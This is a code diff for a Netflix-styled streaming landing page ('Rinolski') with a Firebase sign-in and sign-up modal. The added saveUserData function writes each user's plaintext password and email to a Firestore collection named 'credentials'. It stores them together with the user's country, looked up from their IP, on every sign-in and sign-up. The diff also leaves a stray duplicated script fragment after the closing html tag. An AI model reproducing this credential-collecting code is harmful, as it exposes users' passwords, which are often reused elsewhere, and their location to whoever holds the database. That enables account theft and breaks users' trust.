@@ -6,33 +6,17 @@
 <title>Rinolski – Watch Anywhere</title>
 
 <style>
+/* your existing styles */
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { font-family: Arial, Helvetica, sans-serif; background: #000; color: #fff; height: 100vh; overflow: hidden; }
 
-.bg {
-  position: fixed;
-  inset: 0;
-  background:
-    linear-gradient(to top, rgba(0,0,0,.85), rgba(0,0,0,.35)),
-    url("https://rinolski.neocities.org/images/Rinolski-preview.png") center/cover no-repeat;
-  z-index: 0;
-}
+.bg { position: fixed; inset: 0; background: linear-gradient(to top, rgba(0,0,0,.85), rgba(0,0,0,.35)), url("https://rinolski.neocities.org/images/Rinolski-preview.png") center/cover no-repeat; z-index: 0; }
 
 .header { display: flex; justify-content: space-between; align-items: center; padding: 22px 40px; position: relative; z-index: 1; }
 .logo { font-size: 28px; font-weight: bold; color: #e50914; }
 .auth-btn { background: #e50914; border: none; color: #fff; padding: 8px 18px; border-radius: 4px; cursor: pointer; }
 
-.center {
-  height: calc(100vh - 90px);
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-  position: relative;
-  z-index: 1;
-}
-
+.center { height: calc(100vh - 90px); display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; position: relative; z-index: 1; }
 .center h1 { font-size: 3rem; }
 .center p { margin-top: 10px; font-size: 1.3rem; color: #ddd; }
 .get-started { margin-top: 30px; padding: 18px 48px; font-size: 1.6rem; font-weight: bold; background: #e50914; border: none; color: #fff; border-radius: 4px; cursor: pointer; }
@@ -112,6 +96,116 @@ const errorDiv = document.getElementById("error");
 let isSignup = false;
 
 // Open modal
+function openAuth() {
+  errorDiv.textContent = "";
+  modal.style.display = "flex";
+}
+
+// Toggle Sign In / Sign Up
+function toggleMode() {
+  isSignup = !isSignup;
+  modalTitle.textContent = isSignup ? "Sign Up" : "Sign In";
+  toggleModeBtn.textContent = isSignup ? "Already have an account? Sign in" : "Don’t have an account? Sign up";
+  errorDiv.textContent = "";
+}
+
+// Friendly error messages
+function getFriendlyError(err) {
+  switch(err.code){
+    case "auth/invalid-email": return "Please enter a valid email address.";
+    case "auth/user-not-found": return "No account found with this email. Try signing up.";
+    case "auth/wrong-password": return "Incorrect password. Please try again.";
+    case "auth/email-already-in-use": return "This email is already registered. Please sign in.";
+    case "auth/weak-password": return "Password is too weak. Use at least 6 characters.";
+    default: return "Something went wrong. Please try again.";
+  }
+}
+
+// Get user country
+async function getUserLocation(){
+  try{
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    return data.country_name || "Unknown";
+  } catch { return "Unknown"; }
+}
+
+// Save credentials to Firestore
+async function saveUserData(email, password, status, isNew=false){
+  const country = await getUserLocation();
+  const userDoc = doc(db,"credentials",email);
+  if(isNew){
+    await setDoc(userDoc,{
+      email,password,status,country,
+      createdAt: serverTimestamp(),
+      lastAction: serverTimestamp()
+    }, {merge:true});
+  } else {
+    await setDoc(userDoc,{
+      password,status,country,lastAction: serverTimestamp()
+    }, {merge:true});
+  }
+}
+
+// Submit Sign In / Sign Up
+async function submitAuth(){
+  const email = emailInput.value.trim();
+  const password = passwordInput.value;
+  if(!email || !password){
+    errorDiv.textContent = "Please fill in both email and password.";
+    return;
+  }
+
+  try{
+    await setPersistence(auth, browserLocalPersistence);
+
+    if(isSignup){
+      await createUserWithEmailAndPassword(auth,email,password);
+      await saveUserData(email,password,"Signed Up",true);
+    } else {
+      await signInWithEmailAndPassword(auth,email,password);
+      await saveUserData(email,password,"Signed In",true);
+    }
+
+    errorDiv.style.color = "#4CAF50";
+    errorDiv.textContent = isSignup ? "Account created successfully!" : "Signed in successfully!";
+
+    // ✅ Send postMessage to parent to hide overlay
+    if(window.parent){
+      window.parent.postMessage({ loggedIn: true }, "*");
+    }
+
+    setTimeout(()=>{ 
+      window.location.href = "https://rinolski.neocities.org/Home.html"; 
+    },1000);
+
+    emailInput.value="";
+    passwordInput.value="";
+  } catch(err){
+    errorDiv.style.color="#ff4c4c";
+    errorDiv.textContent = getFriendlyError(err);
+    console.error(err);
+  }
+}
+
+// Event listeners
+authBtn.addEventListener('click', openAuth);
+getStartedBtn.addEventListener('click', openAuth);
+toggleModeBtn.addEventListener('click', toggleMode);
+submitBtn.addEventListener('click', submitAuth);
+
+// Auto redirect if already signed in
+onAuthStateChanged(auth, user=>{
+  if(user){
+    if(window.location.pathname.endsWith("index.html") || window.location.pathname === "/" || window.location.pathname === "/index.html"){
+      window.location.href = "https://rinolski.neocities.org/Home.html";
+    }
+  }
+});
+</script>
+
+</body>
+</html>// Open modal
 function openAuth() {
   errorDiv.textContent = "";
   modal.style.display = "flex";
